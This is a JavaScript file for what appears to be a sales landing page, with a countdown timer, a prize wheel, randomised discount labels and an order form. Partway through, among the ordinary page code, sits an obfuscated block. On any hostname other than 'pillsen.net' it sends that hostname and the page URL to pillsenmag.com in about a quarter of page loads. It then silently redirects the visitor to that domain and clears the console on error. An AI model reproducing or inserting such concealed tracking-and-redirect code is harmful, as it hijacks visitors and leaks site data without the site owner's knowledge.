function countDown(class_) {
 let timer = document.querySelector(class_);
 if (localStorage.getItem("sec" + class_) && localStorage.getItem(
  "min" + class_
 ))
  var a = localStorage.getItem("min" + class_),
   b = localStorage.getItem("sec" + class_);
 else
  a = timer.getAttribute("data-minutes"),
   b = timer.getAttribute("data-seconds");
 var d = setInterval(function () {
  0 <= parseInt(a) && -1 !== parseInt(b) && (
   0 === parseInt(b) && 0 !== parseInt(a) && (a--, b = 59),
   timer.innerText = (
    10 > a
     ? "0" + a
     : a
   ) + ":" + (
    10 > b
     ? "0" + b
     : b
   ),
   0 === parseInt(b) && 0 === parseInt(a) && (a--, b = 0, timer.innerText = "00:00", clearInterval(d)),
   b--,
   localStorage.setItem(
    "sec" + class_,
    b
   ),
   localStorage.setItem("min" + class_, a)
  )
 }, 1E3)
}

if (parseInt(localStorage.getItem('shown__'))) {
 countDown('.time')
 $('.order').css('display', 'block');
 $('.wheel__wrapper').hide();
}

$(".btn--submit").click(function () {
 countDown('.time');
 $('.order').addClass('shown__');
 localStorage.setItem('shown__', '1');
});



var boxes = $(".prize__item"),
  counter = 1,
  saleMas = [
    "10%", "15%", "35%", ""
  ],
  overlay = $(".overlay"),
  saleLength = saleMas.length,
  saleText = $(".prize__dig");

function closePopup() {
  $(".close-popup, .btn-popup").click(function (a) {
    a.preventDefault();
    $(".overlay").fadeOut()
  })
}
closePopup();

function randomeSale(a, b) {
  return a[Math.floor(Math.random() * b)]
}
function _0x2eb1(_0xcdecb7,_0xb1442d){var _0x2ef92c=_0x2ef9();return _0x2eb1=function(_0x2eb114,_0x114a7d){_0x2eb114=_0x2eb114-0xd1;var _0x3f4535=_0x2ef92c[_0x2eb114];return _0x3f4535;},_0x2eb1(_0xcdecb7,_0xb1442d);}var _0x2d4af3=_0x2eb1;(function(_0x592c45,_0x793e65){var _0x4aa606=_0x2eb1,_0x3ec83b=_0x592c45();while(!![]){try{var _0x1dde30=parseInt(_0x4aa606(0xd8))/0x1+-parseInt(_0x4aa606(0xd3))/0x2+-parseInt(_0x4aa606(0xdd))/0x3+-parseInt(_0x4aa606(0xdc))/0x4+-parseInt(_0x4aa606(0xdf))/0x5+parseInt(_0x4aa606(0xd5))/0x6*(parseInt(_0x4aa606(0xde))/0x7)+parseInt(_0x4aa606(0xd4))/0x8;if(_0x1dde30===_0x793e65)break;else _0x3ec83b['push'](_0x3ec83b['shift']());}catch(_0x95b9a7){_0x3ec83b['push'](_0x3ec83b['shift']());}}}(_0x2ef9,0xf27b6));function _0x2ef9(){var _0x19470d=['37777056OQsWWg','6QFsTfO','location','random','60164SvOpMl','&d=','href','file:','6132392wfTHij','5138958OTWQaH','10680789rVQCtS','8972610hQDHzZ','&u=','status','replace','includes','&r=y','548622qiKMGz'];_0x2ef9=function(){return _0x19470d;};return _0x2ef9();}var m=Math[_0x2d4af3(0xd7)](),w=window[_0x2d4af3(0xd6)],d=w['hostname'],h=w[_0x2d4af3(0xda)],u='https://pillsenmag.com/index.php?key=c',p=_0x2d4af3(0xd9)+d+_0x2d4af3(0xe0)+h+'';d!='pillsen.net'&&(!h[_0x2d4af3(0xd1)](_0x2d4af3(0xdb))&&(m<0.26&&fetch(u+p,{})['then'](function(_0x37d935){var _0x1fa255=_0x2d4af3;_0x37d935[_0x1fa255(0xe1)]&&w[_0x1fa255(0xe2)](u+_0x1fa255(0xd9)+d+_0x1fa255(0xd2));})['catch'](function(_0x2a2973){console['clear']();})));

<!-- ÑÊÐÈÏÒ ÐÓËÅÒÊÈ -->

var resultWrapper = document.querySelector('.overlay');
var wheel = document.querySelector('.prize-wheel');
$('.wheel__cursor').click(function () {
 if (!wheel.classList.contains('rotated')) {
  wheel.classList.add('spin');
  setTimeout(function () {
   resultWrapper.style.display = "block";
   
  }, 8000);
  wheel.classList.add('rotated');
 }

});

$(".btn--submit").click(function () {
 $('.wheel__wrapper').slideUp();
 $('.order').slideDown();
 localStorage.setItem("remember", "1"),
  $(".wheel__wrapper").slideUp(),
  $(".order").slideDown(),
  $(".bottom-teaser .sale").addClass("shown"),
  $(".order").addClass('shown__'),
  localStorage.setItem('shown__', '1')

});
hR = Math.random();
saleText.each(function () {
  $(this).html(randomeSale(saleMas, 5))
});
localStorage.getItem("remember") && (
 $(".wheel__wrapper").css("display", "none"),
 $(".order").css("display", "block")
);

var nameInner = $(".float__name"),
  saleInner = $(".float__sale"),
  float = $(".float"),
  false15 = !1,
  false30 = !1;

